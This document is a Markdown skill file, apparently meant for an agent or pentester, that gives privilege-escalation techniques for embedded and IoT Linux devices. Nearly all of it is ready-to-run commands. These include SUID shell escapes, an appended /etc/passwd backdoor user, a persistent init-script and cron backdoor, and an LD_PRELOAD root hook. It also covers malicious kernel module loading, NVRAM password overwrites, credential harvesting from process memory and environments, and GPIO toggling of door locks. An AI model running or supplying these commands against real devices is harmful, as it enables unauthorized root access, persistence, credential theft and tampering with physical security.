---
name: privilege-escalation
description: Embedded device privilege escalation techniques — from limited shell to root, service exploitation, filesystem abuse, kernel vulnerabilities, and misconfigurations in IoT Linux environments
---

# Embedded Device Privilege Escalation

## Initial Access Assessment

### Determine Current Privileges
```bash
id
whoami
cat /etc/passwd
groups
cat /proc/version
uname -a
```

### Enumerate System Configuration
```bash
# Filesystem mount options
mount
cat /proc/mounts
cat /etc/fstab

# Writable directories
find / -writable -type d 2>/dev/null

# SUID/SGID binaries (primary escalation vector on embedded)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# World-writable files
find / -perm -o+w -type f 2>/dev/null

# Capabilities
find / -exec getcap {} \; 2>/dev/null

# Running processes
ps aux 2>/dev/null || ps w

# Cron jobs
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null
cat /var/spool/cron/crontabs/* 2>/dev/null
```

## SUID Binary Exploitation

### Common Exploitable SUID Binaries on Embedded Devices
| Binary | Exploitation Method |
|--------|-------------------|
| `busybox` (SUID) | `busybox sh -p` → root shell |
| `su` | Password brute force, default passwords |
| `sudo` | Misconfigured sudoers, CVE check |
| `ping` | Some versions allow command injection via `-I` |
| `mount` | Mount attacker NFS/USB with SUID shell |
| `nmap` | `nmap --interactive` → `!sh` (older versions) |
| `find` | `find / -exec /bin/sh \;` |
| `awk` | `awk 'BEGIN {system("/bin/sh")}'` |
| `vim/vi` | `:!sh` or `:set shell=/bin/sh` then `:shell` |
| `python` | `python -c 'import os;os.execl("/bin/sh","sh","-p")'` |
| `perl` | `perl -e 'exec "/bin/sh";'` |
| `wget` | Overwrite sensitive files (passwd, shadow, crontab) |

### BusyBox-Specific Escalation
```bash
# BusyBox is ubiquitous in embedded Linux
# Check which applets are available:
busybox --list

# If busybox is SUID root:
busybox sh -p              # Privileged shell
busybox ash -p             # Alternative shell
busybox mount -o loop,exec image.ext2 /mnt  # Mount with exec

# Exploit via busybox applets (even without SUID):
# If 'start-stop-daemon' is available:
busybox start-stop-daemon -S -n test -a /bin/sh

# If 'crond' is available and writable cron dir:
echo "* * * * * /tmp/payload.sh" > /var/spool/cron/crontabs/root
busybox crond -f -c /var/spool/cron/crontabs
```

## Filesystem-Based Escalation

### Writable Configuration Files
```bash
# Check if critical config files are world-writable
ls -la /etc/passwd /etc/shadow /etc/inittab /etc/init.d/* 

# If /etc/passwd is writable → add root-equivalent user
echo 'backdoor:$1$xyz$abc123:0:0::/root:/bin/sh' >> /etc/passwd

# If /etc/inittab is writable → add console on boot
echo '::respawn:/bin/sh' >> /etc/inittab

# If /etc/init.d/ is writable → add startup script
echo '#!/bin/sh\nchmod 4755 /tmp/sh' > /etc/init.d/S99backdoor
chmod +x /etc/init.d/S99backdoor
```

### Overlay/tmpfs Abuse
```bash
# Many embedded devices use read-only squashfs + writable overlay
# Check overlay configuration:
mount | grep overlay
mount | grep tmpfs
cat /proc/mounts | grep -E "overlay|tmpfs|jffs2"

# If overlay is writable:
# Modified files in overlay persist and take precedence
# Write to upper directory of overlay to modify "read-only" files

# tmpfs is writable but volatile (lost on reboot):
# Useful for staging payloads and tools
ls -la /tmp /var/tmp /dev/shm
```

### Shared Library Hijacking
```bash
# Check LD_LIBRARY_PATH and library search order
echo $LD_LIBRARY_PATH
cat /etc/ld.so.conf 2>/dev/null
ldconfig -p 2>/dev/null

# If writable directory is in library search path:
# Compile malicious .so that grants root shell
# Place in search path before legitimate library

# Check for missing libraries loaded by SUID binaries:
ldd /usr/bin/suid_binary 2>/dev/null
# If library is "not found" and search path includes writable dir → hijack

# LD_PRELOAD (if not sanitized for SUID):
# Create libhook.so that overrides a function called by SUID binary
echo 'void _init() { setuid(0); system("/bin/sh"); }' > /tmp/hook.c
# Cross-compile for target architecture, then:
LD_PRELOAD=/tmp/libhook.so /path/to/suid_binary
```

## Service-Based Escalation

### Web Server Exploitation
```bash
# Embedded web servers often run as root
# Common: lighttpd, uhttpd, mini_httpd, goahead, boa

# Check web server process
ps | grep -iE "httpd|lighttpd|uhttpd|goahead|boa"

# If CGI scripts run as root:
# Command injection in CGI → immediate root
# Check CGI directory permissions:
ls -la /www/cgi-bin/ /usr/lib/cgi-bin/

# GoAhead web server: known vulnerabilities
# CVE-2017-17562: Environment variable injection via CGI → RCE as root
# CVE-2019-5096: Double free in multipart form handling
```

### D-Bus / IPC Exploitation
```bash
# Some embedded systems use D-Bus for IPC
# Misconfigured D-Bus policies → call privileged methods
dbus-send --system --print-reply --dest=org.freedesktop.systemd1 \
  /org/freedesktop/systemd1 org.freedesktop.DBus.Introspectable.Introspect

# Check D-Bus configuration
cat /etc/dbus-1/system.conf
ls /etc/dbus-1/system.d/
```

### Exposed Debug Services
```bash
# Telnetd running as root (very common in embedded)
# GDB server on network port → attach and redirect execution
# UART/serial console → often root shell

# Check for debug services:
netstat -tlnp 2>/dev/null || ss -tlnp
# Common debug ports: 23 (telnet), 1234 (gdb), 9999 (debug), 4444 (backdoor)
```

## Kernel Exploitation

### Kernel Version and Module Analysis
```bash
uname -r
cat /proc/version

# Loaded kernel modules
lsmod 2>/dev/null || cat /proc/modules

# Check for known vulnerable kernel versions
# Major embedded kernel exploit targets:
# - DirtyCow (CVE-2016-5195): Linux < 4.8.3
# - DirtyPipe (CVE-2022-0847): Linux 5.8 - 5.16.11
# - Netfilter (CVE-2021-22555): Linux 2.6.19 - 5.12
# - OverlayFS (CVE-2021-3493): Linux < 5.11

# Verify kernel protections:
cat /proc/sys/kernel/randomize_va_space   # ASLR
cat /proc/sys/kernel/dmesg_restrict       # dmesg access
cat /proc/sys/kernel/kptr_restrict        # kernel pointer exposure
```

### Kernel Module Loading
```bash
# If current user can load kernel modules:
# This is root-equivalent
insmod /tmp/malicious_module.ko
# Or via modprobe if module path is writable:
echo "/tmp/malicious_module.ko" > /etc/modules-load.d/evil.conf

# Check if module loading is restricted:
cat /proc/sys/kernel/modules_disabled
# 1 = module loading disabled (secure)
# 0 = modules can be loaded (exploitable)
```

### procfs / sysfs Information Leaks
```bash
# Extract useful information from /proc and /sys
cat /proc/cmdline           # Kernel boot parameters (may contain secrets)
cat /proc/kallsyms          # Kernel symbol addresses (if kptr_restrict=0)
cat /proc/net/tcp            # Network connections
cat /proc/net/arp            # ARP table
ls /sys/firmware/            # Firmware-related sysfs entries
cat /sys/class/gpio/*/value  # GPIO states (physical security bypass)
```

## Embedded-Specific Vectors

### NVRAM / Flash Parameter Tampering
```bash
# Many embedded devices store config in NVRAM
nvram show 2>/dev/null
nvram get http_passwd
nvram get admin_passwd

# If NVRAM is writable:
nvram set http_passwd=hacked
nvram set telnet_enable=1
nvram set ssh_enable=1
nvram commit

# Direct flash access:
cat /dev/mtd0 > /tmp/bootloader.bin     # Dump partitions
cat /dev/mtdblock3 > /tmp/config.bin    # Dump config partition
strings /tmp/config.bin | grep -i pass   # Search for passwords
```

### GPIO / Hardware Interface Abuse
```bash
# If /sys/class/gpio is writable:
# Toggle GPIO pins that control physical security mechanisms
# - Door locks, relays, LEDs, alarm enables
echo 1 > /sys/class/gpio/gpio17/value   # Set GPIO high
echo 0 > /sys/class/gpio/gpio17/value   # Set GPIO low

# I2C/SPI access → read/write to connected EEPROM, sensors
# If i2c-tools available:
i2cdetect -y 0
i2cdump -y 0 0x50                       # Dump EEPROM contents
```

### Cross-Process Credential Harvesting
```bash
# Read credentials from other processes' memory
cat /proc/*/cmdline | tr '\0' ' ' | grep -iE "pass|key|token|secret"

# Process environment variables (may contain API keys, passwords)
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret"

# Memory scraping from processes
# If /proc/pid/mem is readable:
dd if=/proc/<pid>/mem bs=1 skip=<offset> count=4096 2>/dev/null | strings
```

## Automated Enumeration Script
```bash
#!/bin/sh
# Embedded Linux Privilege Escalation Enumeration
echo "=== System Info ==="
id; uname -a; cat /proc/version

echo -e "\n=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null

echo -e "\n=== Writable Dirs ==="
find / -writable -type d 2>/dev/null | head -20

echo -e "\n=== Writable Config ==="
ls -la /etc/passwd /etc/shadow /etc/inittab 2>/dev/null

echo -e "\n=== Running as Root ==="
ps w | awk '$1=="root" || NR==1'

echo -e "\n=== Network Services ==="
netstat -tlnp 2>/dev/null || ss -tlnp 2>/dev/null

echo -e "\n=== NVRAM Passwords ==="
nvram show 2>/dev/null | grep -iE "pass|key|secret|token"

echo -e "\n=== Kernel Protections ==="
echo "ASLR: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null)"
echo "Modules disabled: $(cat /proc/sys/kernel/modules_disabled 2>/dev/null)"
echo "dmesg restrict: $(cat /proc/sys/kernel/dmesg_restrict 2>/dev/null)"
```
